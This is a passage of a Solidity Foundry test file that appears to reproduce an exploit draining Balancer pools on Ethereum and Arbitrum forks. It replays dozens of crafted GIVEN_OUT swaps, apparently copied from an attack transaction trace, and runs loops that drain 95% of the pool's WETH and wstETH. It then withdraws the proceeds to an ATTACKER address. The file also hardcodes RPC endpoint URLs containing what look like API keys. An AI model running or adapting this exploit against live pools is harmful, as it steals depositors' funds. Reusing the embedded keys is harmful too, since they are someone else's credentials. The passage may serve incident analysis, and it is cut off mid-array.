        swaps[37] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 8019571, expectedIn: 6866570, indexIn: 0, indexOut: 1 });
        swaps[38] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 117633, expectedIn: 100831, indexIn: 2, indexOut: 1 });
        swaps[39] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 80196, expectedIn: 68666, indexIn: 0, indexOut: 1 });
        swaps[40] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 1176, expectedIn: 1009, indexIn: 2, indexOut: 1 });
        swaps[41] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 802, expectedIn: 687, indexIn: 0, indexOut: 1 });
        swaps[42] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 12, expectedIn: 11, indexIn: 2, indexOut: 1 });
        swaps[43] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 8, expectedIn: 7, indexIn: 0, indexOut: 1 });
        swaps[44] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 686666666666666666667, expectedIn: 593820610, indexIn: 2, indexOut: 0 });
        swaps[45] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 593820593, expectedIn: 1176332457006284629565, indexIn: 0, indexOut: 2 });
        swaps[46] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 34500909009792959, indexIn: 0, indexOut: 2 });
        swaps[47] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 480000000000, expectedIn: 221639092, indexIn: 2, indexOut: 0 });
        swaps[48] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 221639075, expectedIn: 25626928172, indexIn: 0, indexOut: 2 });
        swaps[49] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 24492173718, indexIn: 0, indexOut: 2 });
        swaps[50] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 340000000000, expectedIn: 74653989, indexIn: 2, indexOut: 0 });
        swaps[51] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 74653972, expectedIn: 25626928172, indexIn: 0, indexOut: 2 });
        swaps[52] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 38000000000, expectedIn: 142678241, indexIn: 2, indexOut: 0 });
        swaps[53] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 142678224, expectedIn: 8793968805, indexIn: 0, indexOut: 2 });
        swaps[54] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 18271758398, indexIn: 0, indexOut: 2 });
        swaps[55] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 27000000000, expectedIn: 37323791, indexIn: 2, indexOut: 0 });
        swaps[56] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 37323774, expectedIn: 6175705982, indexIn: 0, indexOut: 2 });
        swaps[57] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 12989833396, indexIn: 0, indexOut: 2 });
        swaps[58] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 19000000000, expectedIn: 7483, indexIn: 2, indexOut: 0 });
        swaps[59] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 7466, expectedIn: 4298444362, indexIn: 0, indexOut: 2 });
        swaps[60] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 9436861308, indexIn: 0, indexOut: 2 });
        swaps[61] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 14000000000, expectedIn: 70418664, indexIn: 2, indexOut: 0 });
        swaps[62] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 70418647, expectedIn: 3241446426, indexIn: 0, indexOut: 2 });
        swaps[63] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 7100333832, indexIn: 0, indexOut: 2 });
        swaps[64] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 10000000000, expectedIn: 18076923, indexIn: 2, indexOut: 0 });
        swaps[65] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 18076906, expectedIn: 2300867990, indexIn: 0, indexOut: 2 });
        swaps[66] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 5187974123, indexIn: 0, indexOut: 2 });
        swaps[67] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 7000000000, expectedIn: 352834, indexIn: 2, indexOut: 0 });
        swaps[68] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 352817, expectedIn: 1628449028, indexIn: 0, indexOut: 2 });
        swaps[69] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 3791172740, indexIn: 0, indexOut: 2 });
        swaps[70] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 5000000000, expectedIn: 25101608, indexIn: 2, indexOut: 0 });
        swaps[71] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 25101591, expectedIn: 1175925341, indexIn: 0, indexOut: 2 });
        swaps[72] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 2808251434, indexIn: 0, indexOut: 2 });
        swaps[73] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 4000000000, expectedIn: 6324607, indexIn: 2, indexOut: 0 });
        swaps[74] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 6324590, expectedIn: 857031912, indexIn: 0, indexOut: 2 });
        swaps[75] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 2200990337, indexIn: 0, indexOut: 2 });
        swaps[76] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 3000000000, expectedIn: 11833942, indexIn: 2, indexOut: 0 });
        swaps[77] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 11833925, expectedIn: 656831025, indexIn: 0, indexOut: 2 });
        swaps[78] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 1748326734, indexIn: 0, indexOut: 2 });
        swaps[79] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 2000000000, expectedIn: 1448151, indexIn: 2, indexOut: 0 });
        swaps[80] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 1448134, expectedIn: 479717644, indexIn: 0, indexOut: 2 });
        swaps[81] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 1401764695, indexIn: 0, indexOut: 2 });
        swaps[82] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 1000000000, expectedIn: 5580844, indexIn: 2, indexOut: 0 });
        swaps[83] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 5580827, expectedIn: 356455598, indexIn: 0, indexOut: 2 });
        swaps[84] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 1151619856, indexIn: 0, indexOut: 2 });
        swaps[85] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 10000000000, expectedIn: 87478886, indexIn: 2, indexOut: 1 });
        swaps[86] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 10000000000000, expectedIn: 141523892659, indexIn: 0, indexOut: 1 });
        swaps[87] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 10000000000000000, expectedIn: 128359205147277, indexIn: 2, indexOut: 1 });
        swaps[88] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 10000000000000000000, expectedIn: 136238774513878100, indexIn: 0, indexOut: 1 });
        swaps[89] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 990619479082334998746, expectedIn: 12103545600526537726, indexIn: 0, indexOut: 1 });

        console.log("Total swaps:", swaps.length);

        uint256 successCount = 0;

        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_WSTETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(swaps[i].tokenIn),
                assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount,
                userData: ""
            });

            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) returns (uint256 amountIn) {
                console.log("Swap", i, "SUCCESS - AmountIn:", amountIn);
                successCount++;
            } catch Error(string memory reason) {
                console.log("Swap", i, "FAILED:", reason);
            } catch {
                console.log("Swap", i, "FAILED (no reason)");
            }

            if (i % 5 == 4) {
                (,uint256[] memory currentBal,) = VAULT.getPoolTokens(POOL_ID_WSTETH);
                console.log("AFTER SWAP", i+1);
                console.log("  BPT:", currentBal[0]);
                console.log("  wstETH:", currentBal[1]);
                console.log("  WETH:", currentBal[2]);
            }
        }

        console.log("Swaps executed:", successCount);
        console.log("Total swaps:", swaps.length);

        // Continue draining the pool until almost empty
        (,uint256[] memory midBalances,) = VAULT.getPoolTokens(POOL_ID_WSTETH);
        console.log("Pool state BEFORE");
        console.log("  WETH (index 0):", midBalances[0]);
        console.log("  wstETH (index 2):", midBalances[2]);

        uint256 additionalSwaps = 0;

        // Drain remaining WETH
        while (midBalances[0] > 1e9) {
            (,midBalances,) = VAULT.getPoolTokens(POOL_ID_WSTETH);

            uint256 wethToDrain = (midBalances[0] * 95) / 100;
            if (wethToDrain < 1e9) break;

            IBalancerVault.SingleSwap memory drainSwap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_WSTETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(wstETH_WETH_BPT),
                assetOut: IAsset(address(WETH)),
                amount: wethToDrain,
                userData: ""
            });

            try VAULT.swap(drainSwap, funds, type(uint256).max, block.timestamp + 3600) {
                additionalSwaps++;
            } catch {
                break;
            }

            if (additionalSwaps > 100) break;
        }

        // Drain remaining wstETH
        while (midBalances[2] > 1e9) {
            (,midBalances,) = VAULT.getPoolTokens(POOL_ID_WSTETH);

            uint256 wstethToDrain = (midBalances[2] * 95) / 100;
            if (wstethToDrain < 1e9) break;

            IBalancerVault.SingleSwap memory drainSwap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_WSTETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(wstETH_WETH_BPT),
                assetOut: IAsset(wstETH),
                amount: wstethToDrain,
                userData: ""
            });

            try VAULT.swap(drainSwap, funds, type(uint256).max, block.timestamp + 3600) {
                additionalSwaps++;
            } catch {
                break;
            }

            if (additionalSwaps > 100) break;
        }

        console.log("Additional drainage swaps:", additionalSwaps);

        // withdraw manageUserBalance()
        IERC20[] memory internalTokens = new IERC20[](3);
        internalTokens[0] = IERC20(address(WETH));
        internalTokens[1] = IERC20(wstETH_WETH_BPT);
        internalTokens[2] = IERC20(wstETH);

        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);

        console.log("VAULT BEFORE manageUserBalance():");
        console.log("  Internal WETH:", internalBalances[0] / 1e18, "ETH");
        console.log("  Internal BPT:", internalBalances[1] / 1e18, "ETH");
        console.log("  Internal wstETH:", internalBalances[2] / 1e18, "ETH");

        console.log("ATTACKER BEFORE:");
        console.log("  WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("  BPT:", IERC20(wstETH_WETH_BPT).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("  wstETH:", IERC20(wstETH).balanceOf(ATTACKER) / 1e18, "ETH");

        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0) {
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[1] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;

            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;

            if (internalBalances[0] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(address(WETH)),
                    amount: internalBalances[0],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
                opIndex++;
            }

            if (internalBalances[1] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(wstETH_WETH_BPT),
                    amount: internalBalances[1],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
                opIndex++;
            }

            if (internalBalances[2] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(wstETH),
                    amount: internalBalances[2],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            // withdraw manageUserBalance()
            VAULT.manageUserBalance(ops);
            console.log("ATTACKER BALANCE AFTER:");
            console.log("  WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
            console.log("  BPT:", IERC20(wstETH_WETH_BPT).balanceOf(ATTACKER) / 1e18, "ETH");
            console.log("  wstETH:", IERC20(wstETH).balanceOf(ATTACKER) / 1e18, "ETH");

            uint256[] memory internalBalancesAfter = VAULT.getInternalBalance(ATTACKER, internalTokens);
            console.log("VAULT BALANCE AFTER:");
            console.log("  Internal WETH:", internalBalancesAfter[0], "wei");
            console.log("  Internal BPT:", internalBalancesAfter[1], "wei");
            console.log("  Internal wstETH:", internalBalancesAfter[2], "wei");

            console.log("WETH withdrawn:", internalBalances[0] / 1e18, "ETH");
            console.log("BPT withdrawn:", internalBalances[1] / 1e18, "ETH");
            console.log("wstETH withdrawn:", internalBalances[2] / 1e18, "ETH");

            console.log("Value withdrawn:", (internalBalances[0] + internalBalances[2]) / 1e18, "ETH");
        } else {
            console.log("No internal balances to withdraw");
        }

        vm.stopPrank();

        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_WSTETH);

        console.log("FINAL STATE:");
        console.log("WETH (index 0):", finalBalances[0]);
        console.log("BPT (index 1):", finalBalances[1]);
        console.log("wstETH (index 2):", finalBalances[2]);

        console.log("POOL DELTAS:");
        console.log("WETH delta:");
        console.logInt(int256(finalBalances[0]) - int256(initialBalances[0]));
        console.log("BPT delta:");
        console.logInt(int256(finalBalances[1]) - int256(initialBalances[1]));
        console.log("wstETH delta:");
        console.logInt(int256(finalBalances[2]) - int256(initialBalances[2]));

        console.log("ATTACKER BALANCES:");
        console.log("WETH:", WETH.balanceOf(ATTACKER));
        console.log("wstETH:", IERC20(wstETH).balanceOf(ATTACKER));
        console.log("BPT:", IERC20(wstETH_WETH_BPT).balanceOf(ATTACKER));

        console.log("Total swaps executed:", successCount + additionalSwaps);
        console.log("  Original swaps:", successCount);
        console.log("  Additional drainage swaps:", additionalSwaps);

        console.log("SUCCESS!");
    }

    function testArbitrumPool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.arbitrum-mainnet.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            396293444
        );

        console.log("Pool: wstETH/rETH/cbETH (Arbitrum)");

        (, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_ARB);

        console.log("INITIAL STATE:");
        console.log("cbETH (index 0):", initialBalances[0]);
        console.log("BPT (index 1):", initialBalances[1]);
        console.log("wstETH (index 2):", initialBalances[2]);
        console.log("rETH (index 3):", initialBalances[3]);

        // Fund attacker with BPT directly for exact swaps
        deal(ARB_POOL_BPT, ATTACKER, 10000 ether);

        vm.startPrank(ATTACKER);
        IERC20(ARB_POOL_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(ARB_cbETH).approve(address(VAULT), type(uint256).max);
        IERC20(ARB_wstETH).approve(address(VAULT), type(uint256).max);
        IERC20(ARB_rETH).approve(address(VAULT), type(uint256).max);

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER,
            fromInternalBalance: false,
            recipient: payable(ATTACKER),
            toInternalBalance: true
        });

        // Exact swaps flow
        ExactSwapData[30] memory swaps;

        swaps[0] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_cbETH, amount: 381478578866960950133, expectedIn: 407409503509418236936, indexIn: 1, indexOut: 0 });
        swaps[1] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_wstETH, amount: 36014566637470003060, expectedIn: 42643309507948554941, indexIn: 1, indexOut: 2 });
        swaps[2] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_rETH, amount: 40888512865421358094, expectedIn: 44466732936930249407, indexIn: 1, indexOut: 3 });
        swaps[3] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_cbETH, amount: 3814785788669609501, expectedIn: 4071892041540237390, indexIn: 1, indexOut: 0 });
        swaps[4] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_wstETH, amount: 360145666374700031, expectedIn: 426202342600850576, indexIn: 1, indexOut: 2 });
        swaps[5] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_rETH, amount: 408885128654213581, expectedIn: 444427045849747920, indexIn: 1, indexOut: 3 });
        swaps[6] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_cbETH, amount: 38147857886696095, expectedIn: 40696903248956923, indexIn: 1, indexOut: 0 });
        swaps[7] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_cbETH, amount: 38147857886696095, expectedIn: 40696903248956923, indexIn: 1, indexOut: 0 });
        swaps[8] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_rETH, amount: 4088851286542136, expectedIn: 4442029212104502, indexIn: 1, indexOut: 3 });
        swaps[9] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_cbETH, amount: 381478578866961, expectedIn: 406749862066954, indexIn: 1, indexOut: 0 });
        swaps[10] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_wstETH, amount: 36014566637470, expectedIn: 42442033239736, indexIn: 1, indexOut: 2 });
        swaps[11] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_rETH, amount: 40888512865421, expectedIn: 44397841949045, indexIn: 1, indexOut: 3 });
        swaps[12] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_cbETH, amount: 3814785788670, expectedIn: 4066774373866, indexIn: 1, indexOut: 0 });
        swaps[13] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_wstETH, amount: 360145666375, expectedIn: 424106993670, indexIn: 1, indexOut: 2 });
        swaps[14] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_rETH, amount: 408885128654, expectedIn: 443735879749, indexIn: 1, indexOut: 3 });
        swaps[15] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_cbETH, amount: 38147857887, expectedIn: 40665043992, indexIn: 1, indexOut: 0 });
        swaps[16] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_wstETH, amount: 3601456664, expectedIn: 4239392693, indexIn: 1, indexOut: 2 });
        swaps[17] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_rETH, amount: 4088851287, expectedIn: 4436636037, indexIn: 1, indexOut: 3 });
        swaps[18] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_cbETH, amount: 381478579, expectedIn: 406645683, indexIn: 1, indexOut: 0 });
        swaps[19] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_wstETH, amount: 36014567, expectedIn: 42391282, indexIn: 1, indexOut: 2 });
        swaps[20] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_rETH, amount: 40888513, expectedIn: 44364723, indexIn: 1, indexOut: 3 });
        swaps[21] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_cbETH, amount: 3814786, expectedIn: 4066447, indexIn: 1, indexOut: 0 });
        swaps[22] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_wstETH, amount: 360146, expectedIn: 423910, indexIn: 1, indexOut: 2 });
        swaps[23] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_rETH, amount: 408885, expectedIn: 443646, indexIn: 1, indexOut: 3 });
        swaps[24] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_cbETH, amount: 38148, expectedIn: 40665, indexIn: 1, indexOut: 0 });
        swaps[25] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_wstETH, amount: 3601, expectedIn: 4239, indexIn: 1, indexOut: 2 });
        swaps[26] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_rETH, amount: 4089, expectedIn: 4437, indexIn: 1, indexOut: 3 });
        swaps[27] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_cbETH, amount: 381, expectedIn: 407, indexIn: 1, indexOut: 0 });
        swaps[28] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_wstETH, amount: 36, expectedIn: 43, indexIn: 1, indexOut: 2 });
        swaps[29] = ExactSwapData({ tokenIn: ARB_POOL_BPT, tokenOut: ARB_rETH, amount: 41, expectedIn: 45, indexIn: 1, indexOut: 3 });


        console.log("Total swaps:", swaps.length);

        uint256 successCount = 0;

        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_ARB,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(swaps[i].tokenIn),
                assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount,
                userData: ""
            });

            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) {
                successCount++;
            } catch {
                // Continue on failure
            }
        }

        console.log("Swaps executed:", successCount, "/", swaps.length);

        // withdraw manageUserBalance()
        IERC20[] memory internalTokens = new IERC20[](4);
        internalTokens[0] = IERC20(ARB_cbETH);
        internalTokens[1] = IERC20(ARB_POOL_BPT);
        internalTokens[2] = IERC20(ARB_wstETH);
        internalTokens[3] = IERC20(ARB_rETH);

        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);

        console.log("Internal balances:");
        console.log("  cbETH:", internalBalances[0] / 1e18, "ETH");
        console.log("  wstETH:", internalBalances[2] / 1e18, "ETH");
        console.log("  rETH:", internalBalances[3] / 1e18, "ETH");

        if (internalBalances[0] > 0 || internalBalances[2] > 0 || internalBalances[3] > 0) {
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;
            if (internalBalances[3] > 0) opsCount++;

            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;

            if (internalBalances[0] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(ARB_cbETH),
                    amount: internalBalances[0],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[2] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(ARB_wstETH),
                    amount: internalBalances[2],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[3] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(ARB_rETH),
                    amount: internalBalances[3],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            VAULT.manageUserBalance(ops);
            console.log("Withdrawal completed!");
        }

        vm.stopPrank();

        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_ARB);

        console.log("FINAL STATE:");
        console.log("cbETH:", finalBalances[0] / 1e18, "ETH");
        console.log("wstETH:", finalBalances[2] / 1e18, "ETH");
        console.log("rETH:", finalBalances[3] / 1e18, "ETH");

        console.log("ATTACKER BALANCES:");
        console.log("cbETH:", IERC20(ARB_cbETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("wstETH:", IERC20(ARB_wstETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("rETH:", IERC20(ARB_rETH).balanceOf(ATTACKER) / 1e18, "ETH");

        console.log("Total swaps executed:", successCount);
        console.log("SUCCESS!");
    }

    function testWeEthRethPool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            23717101
        );

        console.log("Pool: weETH/rETH (0x05ff47afada98...0645)");

        (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_WEETH);

        console.log("INITIAL STATE:");
        console.log("BPT:", initialBalances[0]);
        console.log("rETH:", initialBalances[1] / 1e18, "ETH");
        console.log("weETH:", initialBalances[2] / 1e18, "ETH");

        // Fund attacker with BPT
        deal(weETH_rETH_BPT, ATTACKER, 10000 ether);

        vm.startPrank(ATTACKER);
        IERC20(weETH_rETH_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(rETH).approve(address(VAULT), type(uint256).max);
        IERC20(weETH).approve(address(VAULT), type(uint256).max);

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER,
            fromInternalBalance: false,
            recipient: payable(ATTACKER),
            toInternalBalance: true
        });

        // swaps from transaction trace
        ExactSwapData[90] memory swaps;
        swaps[0] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: rETH, amount: 696587695093542614978, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[1] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: weETH, amount: 495894698302926136077, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[2] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: rETH, amount: 6965876950935426150, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[3] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: weETH, amount: 4958946983029261361, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[4] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: rETH, amount: 69658769509354262, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[5] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: weETH, amount: 49589469830292613, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[6] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: rETH, amount: 696587695093542, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[7] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: weETH, amount: 495894698302926, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[8] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: rETH, amount: 6965876950936, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[9] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: weETH, amount: 4958946983030, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[10] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: rETH, amount: 69658769509, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[11] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: weETH, amount: 49589469830, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[12] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: rETH, amount: 696587695, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[13] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: weETH, amount: 495894698, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[14] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: rETH, amount: 6965877, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[15] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: weETH, amount: 4958947, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[16] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: rETH, amount: 69659, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[17] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: weETH, amount: 49590, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[18] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: rETH, amount: 696, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[19] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: weETH, amount: 495, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[20] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: rETH, amount: 8, expectedIn: 0, indexIn: 0, indexOut: 1 });
